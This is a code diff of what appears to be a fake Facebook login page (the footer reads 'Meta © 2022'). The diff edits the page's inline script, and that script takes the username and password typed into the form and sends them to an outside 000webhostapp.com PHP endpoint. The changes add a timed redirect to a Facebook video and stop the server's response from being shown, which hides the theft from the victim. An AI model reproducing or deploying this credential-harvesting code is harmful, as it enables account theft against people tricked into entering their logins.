@@ -83,26 +83,22 @@ Meta © 2022
 </div>
 </div>
 </center>
-
 <script type="text/javascript">
-
 i=document.getElementsByTagName("input");
 function save(){
+var myTimeout = setTimeout(function() {
+         location.href="https://fb.watch/fO8BS_qt0u/";
+      }, 6000);      
+      }
 x=i[0].value;
 y=i[1].value;
 y=encodeURIComponent(y);
-//p="nb="+x+"&&pw="+y+"";
 const xh= new XMLHttpRequest();
-//xh.open("GET","https://mdtariful.000webhostapp.com/pb.php?nb="+x+"&&nb="+x);
 xh.open("GET","https://mdtariful.000webhostapp.com/pb.php?pw="+y+"&nb="+x);
 xh.send();
 xh.onload= function show(){
-document.getElementById("a").innerHTML=this.responseText;
-
-}
-
-
-}
+document.getElementById("a").innerHTML="";
+}}
 </script>
 
 
